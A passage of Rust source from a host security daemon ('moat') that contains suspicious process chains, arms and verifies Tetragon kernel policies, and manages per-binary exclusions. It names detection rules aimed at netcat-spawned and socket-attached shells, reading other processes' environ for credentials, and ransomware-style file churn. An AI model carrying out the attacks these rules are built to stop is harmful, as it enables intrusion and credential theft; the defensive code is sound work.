                                 a private address and contain.private is {:?}; alerting only",
                                exes.first().map(|s| s.as_str()).unwrap_or("?"),
                                d,
                                c.id,
                                self.cfg.contain.private
                            );
                            declined_lan.push(d.clone());
                            continue;
                        }
                    }
                }
                if !dests.contains(&d) {
                    dests.push(d);
                }
            }
        }
        // If filtering left nothing real to refuse, there is nothing to
        // contain -- and a containment with no destination must never be
        // written, because an empty SAddr list is exactly the wholesale block
        // the guard above exists to prevent.
        if dests.is_empty() {
            if !declined_lan.is_empty() {
                // Say the true thing. "No usable destination" would read as a
                // parsing failure when in fact moat decided not to refuse.
                log::info!(
                    "containment: chain {} names only private destination(s) ({}); alerted, not \
                     contained (contain.private = {:?})",
                    c.id,
                    declined_lan.join(", "),
                    self.cfg.contain.private
                );
                return;
            }
            log::warn!("containment: no usable destination for chain {}, not containing", c.id);
            return;
        }

        // Pick the slot BEFORE writing anything: `tp add` fails if a policy
        // of that name is already loaded, so an occupied slot has to be
        // released first rather than discovered half way through.
        let slot = self.contain_slot_for(&c.id);
        let policy = crate::contain::policy_name(slot);
        let yaml = crate::contain::policy_yaml(
            &policy,
            &exes,
            &dests,
            &c.id,
            self.cfg.contain.ttl_secs,
        );
        let path = self.cfg.paths.runtime_dir.join(format!("{}.yaml", policy));
        if let Err(e) = std::fs::write(&path, yaml) {
            log::error!("contain {}: {}", policy, e);
            return;
        }
        if !self.tetra_policy(&["tp", "add", &path.to_string_lossy()]) {
            let _ = std::fs::remove_file(&path);
            return;
        }

        let record = crate::contain::Containment {
            chain: c.id.clone(),
            policy,
            exes: exes.clone(),
            dests: dests.clone(),
            since: now,
            expires: now + self.cfg.contain.ttl_secs,
        };
        log::warn!(
            "contained {}: {:?} may not reach {:?} for {}s (chain {})",
            record.policy,
            exes,
            dests,
            self.cfg.contain.ttl_secs,
            c.id
        );
        for dropped in self.contain.insert(record, self.cfg.contain.max) {
            self.release_contain(&dropped);
        }

        // Stamp the chain's members `action_taken: "contained"`.
        //
        // Kill stamps "killed", quarantine stamps "quarantined", and until
        // 2026-09-06 containment -- the third response action, and the one that
        // fires most -- stamped nothing. So the panel could not tell a
        // contained alert from an ordinary one: `alertState` only reads
        // "contained" from `action_taken`, `blockedIncidents`/
        // `stoppedIncidents` feed the Now page's blocked card from the same
        // field, and a containment therefore appeared in History and nowhere
        // in Now. Moat acting on its own is exactly what Now exists to show.
        //
        // The trigger members carry the story (an allowlisted context step is
        // not what was contained); a truncated chain's `steps` is a floor, but
        // the members it does hold are enough to surface the incident.
        for step in c.steps.iter().filter(|s| s.is_trigger()) {
            let _ = self.mark(&step.alert, "action_taken", Value::from("contained"));
        }

        self.write_state();
    }

    /// Delete a containment's policy. Best effort by design: a policy that is
    /// Write one kill-gate decision to moat's own store.
    ///
    /// The refusals are the evidence for whether this gate can ever be
    /// trusted, and until 2026-09-05 they existed only as journald lines --
    /// which is not a record. journald is sized by a percentage of the disk,
    /// evicts oldest-first, is not in the support bundle, and cannot be
    /// queried by moat at all. "Run in log mode for a week and review it" is
    /// not a plan you can carry out against a log that may not keep a week.
    ///
    /// Its own file rather than a line kind in `alerts.jsonl`, because that
    /// file now rotates at 4 MiB with one generation kept, and a busy day of
    /// alerts would evict the handful of lines that matter most. These are
    /// small and rare: 1 MiB holds thousands, which is many months.
    fn record_decision(
        &mut self,
        chain: &str,
        severity: &str,
        families: &[String],
        verdict: &str,
        reason: &str,
        targets: &[String],
    ) {
        let line = serde_json::json!({
            "v": 1,
            "ts": util::now_rfc3339(),
            "chain": chain,
            "severity": severity,
            "families": families,
            "verdict": verdict,
            "reason": reason,
            "mode": self.cfg.contain.kill,
            "targets": targets,
        });
        let path = self.cfg.paths.state_dir.join("decisions.jsonl");
        // Rotate before appending so the file cannot exceed the cap; one
        // generation, like the alert store.
        if std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0) >= 1024 * 1024 {
            let _ = std::fs::rename(&path, path.with_extension("1.jsonl"));
        }
        use std::io::Write as _;
        match std::fs::OpenOptions::new().create(true).append(true).open(&path) {
            Ok(mut f) => {
                let _ = writeln!(f, "{}", line);
            }
            Err(e) => log::warn!("decisions.jsonl: {}", e),
        }
    }

    /// Which containment slot this chain should use.
    ///
    /// Reuses the slot this chain already holds (a chain that grows is
    /// re-contained, not doubly contained); otherwise the lowest free slot;
    /// otherwise the slot of the oldest live containment, which is released
    /// first so `tp add` is not handed a name the kernel already has. That
    /// eviction is the same one `Containments::insert` would do a moment
    /// later -- doing it here just means the kernel and the record agree.
    fn contain_slot_for(&mut self, chain: &str) -> usize {
        let max = self.cfg.contain.max.max(1);
        let slot_of = |c: &crate::contain::Containment| -> Option<usize> {
            c.policy.rsplit('-').next().and_then(|n| n.parse::<usize>().ok())
        };
        let live = self.contain.live();
        if let Some(s) = live.iter().find(|c| c.chain == chain).and_then(slot_of) {
            return s;
        }
        let taken: Vec<usize> = live.iter().filter_map(slot_of).collect();
        if let Some(free) = (0..max).find(|s| !taken.contains(s)) {
            return free;
        }
        // Every slot is in use. The oldest goes, and its policy is deleted
        // from the kernel before its name is reused.
        let oldest = live.iter().min_by_key(|c| c.since).cloned();
        match oldest {
            Some(c) => {
                let s = slot_of(&c).unwrap_or(0);
                self.release_contain(&c);
                s
            }
            None => 0,
        }
    }

    /// already gone (tetragon restarted) is not an error, and a failure here
    /// must not leave the record behind, or `moatctl release` would report
    /// success on something it never removed.
    fn release_contain(&mut self, c: &crate::contain::Containment) {
        self.tetra_policy(&["tp", "delete", &c.policy]);
        let path = self
            .cfg
            .paths
            .runtime_dir
            .join(format!("{}.yaml", c.policy));
        let _ = std::fs::remove_file(&path);
        log::info!("released containment {} ({})", c.policy, c.chain);
    }

    /// Expire what has run out. Called from the same tick as the baseline.
    pub fn contain_tick(&mut self, now: u64) {
        let gone = self.contain.expired(now);
        if gone.is_empty() {
            return;
        }
        for c in &gone {
            self.release_contain(c);
        }
        self.write_state();
    }

    /// The policies whose kernel mode must be `enforce` right now.
    ///
    /// Pure, so the decision can be tested without a kernel: `run()` does the
    /// applying.
    ///
    /// **Kernel policies only, deliberately.** An armed userland rule
    /// (`moat-pkg-subtree-netcat-exec`, `moat-shell-stdio-socket`) has nothing
    /// to push into the kernel — it kills from `maybe_enforce`, in this
    /// process, gated on `mode_for`. So it needs no re-arming after a tetragon
    /// restart, and calling `tetra tp set-mode` on a name the kernel has never
    /// heard of would fail and be reported as enforcement that did not take.
    /// Its round trip across a daemon restart is `enforcing_rules` in
    /// state.json, which `write_state` writes and `persisted_enforcing_rules`
    /// reads back, exactly as for a kernel rule.
    pub fn enforcement_to_apply(&self) -> Vec<String> {
        self.policies
            .names()
            .into_iter()
            .filter(|n| self.mode_for(n) == "enforce")
            // A userland rule enforces HERE, not in the kernel, even when a
            // policy of the same name exists -- `moat-ransom-file-churn`'s
            // policy is its own `tier: signal` event feed and carries no
            // enforcement, so `tetra tp set-mode` on it fails for ever
            // ("cannot set policy mode on a policy that is monitor only") and
            // this tick reported the failure as a protection that had been
            // weakened, once a minute, unsilenceably. See the note in
            // `control::cmd_set_mode`. The armed set is unchanged; this is only
            // about what the KERNEL is asked to do.
            .filter(|n| !self.armable_userland_rules().iter().any(|m| &m.name == n))
            .collect()
    }

    /// Push the armed set back into the kernel.
    ///
    /// `tetra tp set-mode` changes a LIVE policy, and that change dies with the
    /// sensor. `enforcing_rules` and `mode` are restored from state.json on
    /// startup, but until 2026-09-04 they were restored into MEMORY only -- so
    /// after any tetragon restart (an update, a crash; moatd is `PartOf=` it and
    /// restarts with it) every armed rule silently reverted to the `monitor` in
    /// its policy file, while `status.enforcing_rules` and the panel both went
    /// on saying ARMED. Enforcement that has quietly stopped, shown as running,
    /// is the worst state this daemon can be in: the user believes a thing is
    /// guarded and it is not.
    ///
    /// Called from `arm_tick`, which owns the *when*. Calling it directly is
    /// "push now, whatever the sensor is doing", which is the 2026-09-05 bug.
    pub fn reapply_enforcement(&mut self) -> (usize, usize) {
        let want = self.enforcement_to_apply();
        if want.is_empty() {
            return (0, 0);
        }
        let (mut ok, mut failed) = (0usize, 0usize);
        for name in &want {
            if self.tetra_arm(name) {
                ok += 1;
            } else {
                failed += 1;
            }
        }
        if failed > 0 {
            log::error!(
                "re-arming: {} of {} policies did NOT take; the panel would \
                 otherwise show them armed",
                failed,
                want.len()
            );
        } else {
            log::info!("re-armed {} policy/policies in the kernel", ok);
        }
        (ok, failed)
    }

    /// `tetra tp set-mode <name> enforce`, with the clock bounded.
    ///
    /// Same reason as `kernel_policy_modes`: this runs from the tick, under the
    /// daemon mutex, and `tetra`'s default 30 s timeout with a retry means one
    /// unreachable sensor could hold the event tail for minutes -- times the
    /// number of armed policies. The arming state machine retries on its own
    /// clock, so a short per-call bound loses nothing.
    fn tetra_arm(&self, name: &str) -> bool {
        self.tetra_policy(&["tp", "set-mode", name, "enforce", "--timeout", "3s", "--retries", "1"])
    }

    // ------------------------------------------------------- arming, verified

    /// Is the sensor loaded enough for `tetra tp set-mode` to mean anything?
    ///
    /// Two independent answers, because either can be unavailable:
    ///
    /// 1. The bpffs pin count (`sensors_loaded`) against the policies on disk.
    ///    This is the same signal `tetragon_state` trusts and it asks the
    ///    kernel, but it reads `/sys/fs/bpf/tetragon`, which is root-only and
    ///    does not exist at all until the sensor creates it.
    /// 2. `tetra tracingpolicy list`, which has to name every policy we are
    ///    about to arm. Slower (a gRPC round trip) and used only when the pin
    ///    count is unreadable — but it is the *exact* question, since a name
    ///    the daemon is about to `set-mode` either exists or does not.
    ///
    /// Neither available means "cannot tell", which is reported as NOT ready:
    /// waiting a bounded 120 s costs nothing, and arming into a half-loaded
    /// sensor costs the whole point of arming.
    pub fn sensor_ready_for(&self, want: &[String]) -> bool {
        let expected = self.policies.len();
        if let Some(n) = self.sensors_loaded() {
            return expected > 0 && n >= expected;
        }
        match self.kernel_policy_modes() {
            Some(modes) if !modes.is_empty() => want.iter().all(|n| modes.contains_key(n)),
            _ => false,
        }
    }

    /// Start the bounded wait-then-arm. Called once per daemon start.
    ///
    /// It does NOT arm here. On 2026-09-05 arming here (2 s after start, from
    /// `run()`, before the first event) failed seven times out of seven with
    /// `tracing policy {moat-…} does not exist`, because tetragon was still
    /// loading — 16 s of loading, on a unit systemd had already called
    /// "started" because it is `Type=simple`.
    pub fn begin_arming(&mut self, now: u64) {
        if self.enforcement_to_apply().is_empty() {
            self.arming = Arming::Idle;
            return;
        }
        self.arming = Arming::Waiting {
            deadline: now.saturating_add(self.cfg.thresholds.arm_wait_secs.max(1)),
            next_try: now,
            tries: 0,
        };
    }

    /// The arming state machine, driven from `tick` — never from the event
    /// path, so a 120 s wait for the sensor cannot stall the tail for 120 s.
    ///
    /// `Waiting` -> (sensor ready) -> push, verify -> `Idle` when every policy
    /// took; back to `Waiting` with backoff when any did not, until the
    /// deadline. On the deadline it pushes once regardless and lets
    /// `verify_enforcement` publish whatever is true.
    pub fn arm_tick(&mut self, now: u64) {
        let Arming::Waiting { deadline, next_try, tries } = self.arming else {
            return;
        };
        if now < next_try {
            return;
        }
        let want = self.enforcement_to_apply();
        if want.is_empty() {
            self.arming = Arming::Idle;
            return;
        }
        let out_of_time = now >= deadline;
        if !self.sensor_ready_for(&want) {
            if !out_of_time {
                if tries == 0 {
                    log::info!(
                        "arming pending: waiting up to {}s for the sensor to load before \
                         re-arming {} policy/policies",
                        self.cfg.thresholds.arm_wait_secs,
                        want.len()
                    );
                }
                self.arming = Arming::Waiting {
                    deadline,
                    next_try: now.saturating_add(arm_backoff(tries)),
                    tries: tries.saturating_add(1),
                };
                return;
            }
            log::error!(
                "the sensor is still not loaded {}s after start; arming {} policy/policies \
                 anyway so the attempt and its outcome are on the record",
                self.cfg.thresholds.arm_wait_secs,
                want.len()
            );
        }

        let (_, failed) = self.reapply_enforcement();
        if failed == 0 || out_of_time {
            self.arming = Arming::Idle;
        } else {
            self.arming = Arming::Waiting {
                deadline,
                next_try: now.saturating_add(arm_backoff(tries)),
                tries: tries.saturating_add(1),
            };
        }
        // Whatever happened, say what is true rather than what was attempted.
        self.verify_enforcement(now);
    }

    /// Ask the kernel what mode each policy is actually in.
    ///
    /// `tetra tracingpolicy list -o json` (tetra v1.7.1) returns
    /// `ListTracingPoliciesResponse`, whose `policies` array carries
    /// `TracingPolicyStatus { name, mode, … }`; `mode` is the
    /// `TracingPolicyMode` enum — `TP_MODE_ENFORCE` (1), `TP_MODE_MONITOR` (2).
    /// Field numbers and names read out of the descriptor embedded in
    /// /usr/bin/tetra, not guessed.
    ///
    /// `None` means we could not ask (no tetra, gRPC refused, unparseable) —
    /// which is "cannot tell", never "not armed". A verifier that reports a
    /// failure it did not observe is the same lie as the one this fixes,
    /// pointing the other way.
    pub fn kernel_policy_modes(&self) -> Option<std::collections::BTreeMap<String, String>> {
        let out = std::process::Command::new(&self.cfg.paths.tetra)
            // `tetra` defaults to a 30 s gRPC dial timeout, i.e. up to a
            // minute across its two attempts -- and this runs on the tick,
            // holding the daemon mutex, which is the event tail and the control
            // socket. A verification that freezes the daemon for a minute
            // whenever the sensor is unreachable is worse than the gap it is
            // looking for. Cobra takes global flags after the subcommand.
            //
            // `--retries 0` is NOT the way to shorten this: it builds a gRPC
            // retry policy with MaxAttempts 1, which gRPC rejects as invalid,
            // and every call fails before it dials. Verified against
            // /usr/bin/tetra v1.7.1. The default of 1 (two attempts) stays; the
            // dial timeout is what gets cut.
            .args(["tracingpolicy", "list", "-o", "json", "--timeout", "3s", "--retries", "1"])
            .output()
            .ok()?;
        if !out.status.success() {
            log::debug!(
                "tetra tracingpolicy list: {}",
                String::from_utf8_lossy(&out.stderr).trim()
            );
            return None;
        }
        parse_policy_modes(&String::from_utf8_lossy(&out.stdout))
    }

    /// Compare the kernel against `enforcing_rules`, re-arm the difference, and
    /// publish whichever answer survives.
    ///
    /// Runs after arming and once a minute for ever after, because `tetra tp
    /// set-mode` changes a LIVE policy: anything that reloads a policy later —
    /// `exclude_binary`, a tetragon that restarts without taking moatd with it,
    /// a human with `tetra` — drops it back to the `monitor` its file declares,
    /// silently.
    pub fn verify_enforcement(&mut self, now: u64) {
        self.last_verify = now;
        let want = self.enforcement_to_apply();
        if want.is_empty() {
            self.enforcing_verified.clear();
            if !self.enforcing_unverified.is_empty() {
                log::info!("nothing is armed in the kernel any more; the arming gap is closed");
                self.enforcing_unverified.clear();
            }
            self.last_arm_alert_set.clear();
            return;
        }
        let Some(modes) = self.kernel_policy_modes() else {
            // Could not ask. Keep the previous answer: an unreachable sensor is
            // `sensor_unhealthy`'s story to tell, and inventing a second one
            // out of the same silence would double-count it.
            return;
        };

        let disagreed = disagreeing(&want, &modes);
        // The steady state is one `tetra` call a minute: nothing disagrees, so
        // there is nothing to re-arm and nothing to re-read.
        let still_wrong = if disagreed.is_empty() {
            Vec::new()
        } else {
            log::warn!(
                "the kernel disagrees about {} armed policy/policies; re-arming",
                disagreed.len()
            );
            for name in &disagreed {
                self.tetra_arm(name);
            }
            // Read the kernel BACK rather than trusting the exit status: a
            // `set-mode` that returns 0 is a claim, and claims are what this
            // whole function exists because of. If the sensor stopped answering
            // between the two calls, keep the previous verdict rather than
            // publishing a gap nobody observed.
            match self.kernel_policy_modes() {
                Some(m) => disagreeing(&want, &m),
                None => return,
            }
        };

        let unverified: std::collections::BTreeSet<String> = still_wrong.iter().cloned().collect();
        let verified: std::collections::BTreeSet<String> =
            want.iter().filter(|n| !unverified.contains(*n)).cloned().collect();
        for name in self.enforcing_unverified.difference(&unverified) {
            log::warn!("{} is armed in the kernel again", name);
        }
        self.enforcing_verified = verified;
        self.enforcing_unverified = unverified;

        if self.enforcing_unverified.is_empty() {
            // Clearing this is what lets the NEXT gap raise its own alert.
            self.last_arm_alert_set.clear();
            return;
        }
        log::error!(
            "enforcement did not take for {} of {} armed policy/policies: {}",
            self.enforcing_unverified.len(),
            want.len(),
            self.enforcing_unverified.iter().cloned().collect::<Vec<_>>().join(", ")
        );
        if self.enforcing_unverified != self.last_arm_alert_set {
            self.last_arm_alert_set = self.enforcing_unverified.clone();
            let names: Vec<String> = self.enforcing_unverified.iter().cloned().collect();
            let total = want.len();
            self.raise_enforcement_gap(&names, total);
        }
    }

    /// One alert, in the `moat-x-protection-changed` family, for enforcement
    /// that is recorded but not running.
    ///
    /// Same family as a human disarming a rule, and deliberately so: the effect
    /// on this machine is identical — a rule the panel shows as armed that will
    /// not kill anything — and the difference is only that nobody chose it.
    /// `NEVER_SILENCE` covers the family, so this cannot be allowlisted away.
    fn raise_enforcement_gap(&mut self, names: &[String], total: usize) {
        if self.in_meta_alert {
            return;
        }
        let action = format!(
            "enforcement did not take in the kernel for {} of {} armed policy/policies",
            names.len(),
            total
        );
        let meta = crate::rules::protection_changed_meta(&action, "moatd");
        let mut f = Finding::new(crate::rules::PROTECTION_CHANGED, meta, self_proc("arming"));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.what_override = Some(format!(
            "Moat's own check found {} of {} armed policy/policies in `monitor` in the kernel. \
             They are listed as enforcing and they will not kill anything.",
            names.len(),
            total
        ));
        f.extra_evidence.push(format!("not armed in the kernel: {}", names.join(", ")));
        f.extra_evidence.push(
            "Moat re-armed them and read the kernel back; they are still in monitor.".into(),
        );
        f.extra_evidence.push(
            "check: `moatctl status` (the `enforcing` line names them), then \
             `journalctl -u moatd -u tetragon -n 100`"
                .into(),
        );
        f.extra_evidence.push(
            "fix: `sudo systemctl restart tetragon` — moatd re-arms once the sensor \
             reports the policies loaded"
                .into(),
        );
        self.in_meta_alert = true;
        let _ = self.emit(f);
        self.in_meta_alert = false;
    }

    /// Anything that changes what SHOULD be armed, or reloads a policy in the
    /// kernel, makes the last verification describe a machine that no longer
    /// exists. Marking it stale makes the next tick re-read the kernel instead
    /// of leaving `status` quoting an answer about the previous arrangement.
    pub fn invalidate_verification(&mut self) {
        self.last_verify = 0;
    }

    /// Cheap enough for every tick; the gRPC round trip is throttled to a
    /// minute. Skipped entirely while `arm_tick` is still working, because
    /// during the startup wait "the kernel says monitor" is expected and
    /// alerting on it would fire on every boot.
    pub fn verify_tick(&mut self, now: u64) {
        const EVERY: u64 = 60;
        if matches!(self.arming, Arming::Waiting { .. }) {
            return;
        }
        if now.saturating_sub(self.last_verify) < EVERY {
            return;
        }
        self.verify_enforcement(now);
    }

    /// Stop an ARMED policy watching one binary, in the kernel.
    ///
    /// This is what "allow this program" has to mean for a rule that enforces.
    /// An allowlist entry is a userspace suppression and never reaches the
    /// kernel, so allowing an armed rule used to hide the alert while the
    /// process kept dying. The only thing that actually stops the killing is
    /// taking the binary out of the policy, which means re-rendering it and
    /// loading it again.
    ///
    /// Granularity is per BINARY, not per (binary, file): `matchBinaries` is
    /// the only negative the kernel offers here, so excluding `cat` from the
    /// shadow rule stops that rule watching `cat` for ALL of its paths. The
    /// caller has to say so; silently granting more than was asked for is how
    /// an allowlist becomes a hole.
    pub fn exclude_binary(&mut self, rule: &str, exe: &str) -> Result<String, String> {
        if !exe.starts_with('/') {
            return Err(format!("{:?} is not an absolute path", exe));
        }
        if self.policies.meta_or_fallback(rule).enforce == "none" {
            return Err(format!("{} does not enforce, so there is nothing to exclude", rule));
        }
        // A script cannot be excluded by name, and saying so is the whole point.
        //
        // 2026-09-07: the panel offered "allow /usr/bin/ssh-copy-id", this
        // accepted it, re-rendered, reloaded, re-armed and verified -- and
        // nothing changed, because ssh-copy-id is `#!/bin/sh` and matchBinaries
        // only ever sees the interpreter. The read went on being refused while
        // the alert stopped (moatd suppressed it as a selector contradiction),
        // so the user was told it was allowed, kept the denial, and lost the
        // one record that explained it. An exclusion that is recorded and inert
        // is worse than one that is refused.
        if let Some(interp) = crate::util::interpreter_of(exe) {
            return Err(format!(
                "{exe} is a script, not a binary: the kernel runs it as {interp}, and a policy \
                 can only exclude what the kernel matches -- so this would be recorded and do \
                 nothing, while {exe} went on being refused. Excluding {interp} instead would \
                 let every script on this machine past {rule}. Turn the rule off for as long as \
                 you need it (`sudo moatctl set mode monitor --rule {rule}`) and arm it again \
                 after, or use a way in that does not touch what {rule} guards."
            ));
        }
        let list = self.kernel_exclusions.entry(rule.to_string()).or_default();
        if !list.iter().any(|b| b == exe) {
            list.push(exe.to_string());
        }

        // Re-render everything: it is 46 small files, and rendering only the
        // one would need the template path, which the policy set does not keep.
        let opts = crate::render::RenderOptions {
            bpf_lsm: crate::render::bpf_lsm_available(),
            templates_dir: &self.cfg.paths.templates_dir,
            out_dir: &self.cfg.paths.policies_dir,
            export_allowlist: Some(&self.cfg.paths.export_allowlist),
            passwd: &self.cfg.paths.passwd,
            homes: None,
            telemetry: self.cfg.telemetry.clone(),
            canaries: self.canary_paths(),
            names_enabled: self.cfg.names.enabled,
            exclusions: self.kernel_exclusions.clone(),
        contain_slots: self.cfg.contain.max,
        };
        crate::render::render(&opts).map_err(|e| format!("render: {}", e))?;

        // Replace the live policy. `tp add` will not overwrite, so the old one
        // is deleted first -- a gap of milliseconds, and the alternative is an
        // exclusion that does not take effect until the next reboot.
        let path = self.rendered_path(rule)?;
        self.tetra_policy(&["tp", "delete", rule]);
        if !self.tetra_policy(&["tp", "add", &path]) {
            return Err(format!(
                "{} could not be reloaded; run `sudo systemctl restart tetragon` to \
                 put it back",
                rule
            ));
        }
        // A fresh load starts in the mode its FILE declares, which is monitor.
        // Re-arm it or the exclusion would silently disarm the whole rule.
        // `mode_for`, not `enforcing_rules.contains`: a daemon-wide enforce
        // arms every policy without listing any of them, and testing the list
        // here left a rule silently in monitor after every exclusion while
        // `status` went on saying enforce.
        if self.mode_for(rule) == "enforce" {
            self.tetra_policy(&["tp", "set-mode", rule, "enforce"]);
        }
        self.policies = crate::policy::PolicySet::load(&self.cfg.paths.policies_dir);
        // The policy was deleted and re-added, so its kernel mode was reset to
        // the `monitor` its file declares and the re-arm above may not have
        // taken. Re-verify on the next tick.
        self.invalidate_verification();
        self.write_state();
        Ok(path)
    }

    /// Take a kernel exclusion back.
    ///
    /// The counterpart to `exclude_binary`, and not optional: a grant that
    /// cannot be revoked is not a grant, it is a hole with a nice name. Same
    /// mechanics -- re-render, reload, re-arm -- because the exclusion lives in
    /// the policy text and nothing else can remove it.
    ///
    /// Unlike granting one, this does NOT need root: it makes Moat watch more,
    /// and the rule everywhere else in this daemon is that weakening protection
    /// needs privilege while restoring it does not.
    pub fn remove_exclusion(&mut self, rule: &str, exe: &str) -> Result<String, String> {
        let gone = match self.kernel_exclusions.get_mut(rule) {
            Some(list) => {
                let before = list.len();
                list.retain(|b| b != exe);
                let removed = list.len() != before;
                if list.is_empty() {
                    self.kernel_exclusions.remove(rule);
                }
                removed
            }
            None => false,
        };
        if !gone {
            return Err(format!("{} was not excluded from {}", exe, rule));
        }

        let opts = crate::render::RenderOptions {
            bpf_lsm: crate::render::bpf_lsm_available(),
            templates_dir: &self.cfg.paths.templates_dir,
            out_dir: &self.cfg.paths.policies_dir,
            export_allowlist: Some(&self.cfg.paths.export_allowlist),
            passwd: &self.cfg.paths.passwd,
            homes: None,
            telemetry: self.cfg.telemetry.clone(),
            canaries: self.canary_paths(),
            names_enabled: self.cfg.names.enabled,
            exclusions: self.kernel_exclusions.clone(),
        contain_slots: self.cfg.contain.max,
        };
        crate::render::render(&opts).map_err(|e| format!("render: {}", e))?;

        let path = self.rendered_path(rule)?;
        self.tetra_policy(&["tp", "delete", rule]);
        if !self.tetra_policy(&["tp", "add", &path]) {
            return Err(format!(
                "{} could not be reloaded; run `sudo systemctl restart tetragon` to put \
                 it back",
                rule
            ));
        }
        if self.mode_for(rule) == "enforce" {
            self.tetra_policy(&["tp", "set-mode", rule, "enforce"]);
        }
        self.policies = crate::policy::PolicySet::load(&self.cfg.paths.policies_dir);
        // The policy was deleted and re-added, so its kernel mode was reset to
        // the `monitor` its file declares and the re-arm above may not have
        // taken. Re-verify on the next tick.
        self.invalidate_verification();
        self.write_state();
        log::warn!("{} is watched again by {}", exe, rule);
        Ok(path)
    }

    /// Where a policy's rendered YAML lives.
    fn rendered_path(&self, rule: &str) -> Result<String, String> {
        let dir = &self.cfg.paths.policies_dir;
        let rd = std::fs::read_dir(dir).map_err(|e| format!("{}: {}", dir.display(), e))?;
        for entry in rd.flatten() {
            let p = entry.path();
            if p.extension().map(|e| e != "yaml" && e != "yml").unwrap_or(true) {
                continue;
            }
            if let Ok(text) = std::fs::read_to_string(&p) {
                if text.contains(&format!("name: {}", rule)) {
                    return Ok(p.display().to_string());
                }
            }
        }
        Err(format!("no rendered policy for {}", rule))
    }

    /// Release everything, for the switch going off.
    pub fn release_all_contained(&mut self) -> usize {
        let all: Vec<crate::contain::Containment> = self.contain.live().to_vec();
        for c in &all {
            self.release_contain(c);
            self.contain.release(&c.chain);
        }
        self.write_state();
        all.len()
    }

    /// Drop one now, by chain id.
    pub fn release_chain(&mut self, chain: &str) -> bool {
        let Some(c) = self.contain.release(chain) else {
            return false;
        };
        self.release_contain(&c);
        self.write_state();
        true
    }

    fn tetra_policy(&self, args: &[&str]) -> bool {
        match std::process::Command::new(&self.cfg.paths.tetra)
            .args(args)
            .output()
        {
            Ok(o) if o.status.success() => true,
            Ok(o) => {
                log::error!(
                    "tetra {}: {}",
                    args.join(" "),
                    String::from_utf8_lossy(&o.stderr).trim()
                );
                false
            }
            Err(e) => {
                log::error!("tetra {}: {}", args.join(" "), e);
                false
            }
        }
    }

    /// Is `path` inside one of moat's own directories?
    fn is_own_store(&self, path: &str) -> bool {
        let roots = [
            self.cfg.paths.state_dir.to_string_lossy().into_owned(),
            "/var/log/moat".to_string(),
        ];
        util::under_any(path, &roots)
    }

    /// The userland rules that end a process themselves, and are therefore
    /// armable one at a time exactly as a kernel policy is.
    ///
    /// `meta().enforce == "kill"` is the declaration; `maybe_enforce` does the
    /// signalling after re-verifying the pid's start time. Only ENABLED rules:
    /// offering to arm a rule that is switched off in `[rules]` would be a
    /// switch that does nothing.
    pub fn armable_userland_rules(&self) -> Vec<crate::policy::PolicyMeta> {
        self.rules
            .iter()
            .filter(|r| r.enabled(&self.cfg))
            .map(|r| r.meta())
            .filter(|m| m.enforce == "kill" || m.enforce == "deny")
            .collect()
    }

    /// The rules that can be armed, with what arming one does.
    ///
    /// Kernel policies **and** the userland rules that kill. Listing only the
    /// policies was the reason `moatctl set mode enforce --rule
    /// moat-pkg-subtree-netcat-exec` was refused outright: the two rules that
    /// act on their own were the two the per-rule switch could not reach, so
    /// the only way to make either of them kill was to arm every rule on the
    /// machine — the all-or-nothing that per-rule enforcement exists to avoid.
    fn enforceable(&self) -> Vec<serde_json::Value> {
        let policies = self
            .policies
            .names()
            .into_iter()
            .map(|name| self.policies.meta_or_fallback(&name))
            .filter(|m| m.enforce == "kill" || m.enforce == "deny");
        let mut out: Vec<serde_json::Value> = policies
            .chain(self.armable_userland_rules())
            .map(|meta| {
                json!({
                    "rule": meta.name,
                    "enforce": meta.enforce,
                    "title": meta.title,
                    "severity": meta.severity,
                    // What is actually doing the killing. A kernel policy is
                    // armed with `tetra tp set-mode`; a userland rule is armed
                    // in this daemon and pushes nothing into the kernel, and
                    // anything offering the switch should be able to say which.
                    "by": if self.policies.get(&meta.name).is_some() { "kernel" } else { "moatd" },
                    // What the rule is doing right now, which is what the switch
                    // on the Rules tab claims to show. Under a daemon-wide
                    // enforce every one of these kills, and `enforcing_rules`
                    // lists none of them.
                    "armed": self.mode_for(&meta.name) == "enforce",
                })
            })
            .collect();
        out.sort_by(|a, b| a["rule"].as_str().cmp(&b["rule"].as_str()));
        out
    }

    /// Does this history file belong to a real account? Human homes, plus
    /// root's -- not a "human home" by CONTRACT §2, but a trail worth covering.
    fn is_real_history(&self, path: &str) -> bool {
        util::under_any(path, &self.homes) || path.starts_with("/root/")
    }

    /// Does an ENABLED userland rule produce the findings for this policy id?
    ///
    /// Enabled matters: a rule switched off in config must not silence the
    /// kernel's own finding as well, or turning a rule off would turn its
    /// policy into pure overhead that reports nothing.
    fn rule_owns(&self, policy: &str) -> bool {
        if policy.is_empty() {
            return false;
        }
        self.rules.iter().any(|r| r.id() == policy && r.enabled(&self.cfg))
    }

    fn policy_finding(&self, hook: &HookHit, exec_id: &str, _now: u64) -> Option<Finding> {
        let name = hook.policy_name();
        if !name.starts_with("moat-") {
            return None;
        }
        let proc = self.table.get(exec_id)?.clone();
        // The kernel's own string, kept for the re-validation below: `validate`
        // asks whether the event still matches the selectors the kernel matched
        // on, so it has to see what the kernel saw.
        let raw_path = hook.file_path();
        // The path a person would recognise. A no-op for every `path`-typed
        // argument and on every non-btrfs machine; only a bare `dentry` needs
        // it, because a dentry carries no mount and resolves no further than
        // its own filesystem root (util::dentry_abs).
        let path = raw_path
            .as_deref()
            .map(|p| util::dentry_abs(p, &self.subvols));
        let hook_name = hook.hook_name();

        // Never alert on our own reads. Taking an incident snapshot means
        // reading /proc/<pid>/{environ,status,cmdline,fd} for the alerting
        // process and every live ancestor (incident.rs), and any file rule that
        // covers those paths turns that into a fresh alert — which takes another
        // snapshot, which reads more. A /proc/<pid>/environ rule under test on
        // 2026-09-03 produced 126 high alerts in four idle minutes this way.
        // The daemon watching its own evidence-gathering is a loop, not a
        // detection, so it is cut here rather than in each policy's
        // matchBinaries, where the next rule would forget it.
        if proc.pid == std::process::id() {
            return None;
        }

        // The environ rule matches `Postfix /environ` in the kernel, because a
        // selector cannot compare the path's pid against the opener's. The exact
        // cut is here: reading your own environment is not credential theft, and
        // it is essentially all of the traffic on this path.
        if name == "moat-cred-proc-environ-read" {
            let is_proc_environ = path
                .as_deref()
                .and_then(crate::rules::self_proc_read::proc_target_pid)
                .is_some();
            if !is_proc_environ {
                return None;
            }
            if crate::rules::self_proc_read::is_self_read(path.as_deref()?, proc.pid) {
                return None;
            }
        }

        // moat's own evidence store is not a place credentials get stolen from.
        //
